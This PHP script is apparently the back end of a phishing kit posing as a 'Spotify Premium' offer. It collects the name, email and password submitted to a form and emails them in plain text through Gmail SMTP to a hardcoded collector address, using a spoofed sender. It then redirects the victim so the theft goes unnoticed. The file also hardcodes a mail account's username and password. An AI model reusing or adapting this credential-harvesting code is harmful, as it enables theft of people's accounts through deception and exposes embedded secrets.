<?php

require './clases/PHPMailerAutoload.php';
include("./clases/class.phpmailer.php");
include("./clases/class.smtp.php");

$nombre = $_POST['nombre'];
$email = $_POST['email'];
$password = $_POST['password'];
$mensaje = "Nombre: ".$nombre."<br>Email: ".$email."<br>Password: ".$password;

$mail = new PHPMailer();
$mail->IsSMTP();

//$mail->SMTPDebug=1;
$mail->Debugoutput = 'html';

$mail->SMTPAuth = true;
$mail->SMTPSecure = "tls"; //tls
$mail->Host = "smtp.gmail.com";
$mail->Port = 587; //587
$mail->Username = "drmseries@gmail.com";
$mail->Password = "nolose9192";


$mail->From = "spotifypremium@gmail.com";
$mail->FromName = $nombre;
$mail->Subject = "Spotify Premium";
//$mail->AltBody = "Hola";
$mail->MsgHTML($mensaje);
//$mail->AddAttachment(“files/files.zip”);
//$mail->AddAttachment(“files/img03.jpg”);
$mail->AddAddress("drmseries@gmail.com");

$mail->IsHTML(true);
if(!$mail->Send()) {
echo "Error: " . $mail->ErrorInfo;
} else {
echo "Mensaje enviado correctamente";
}
header("Location:index.php?finalizado=true&nombre=$nombre&email=$email");
 
?>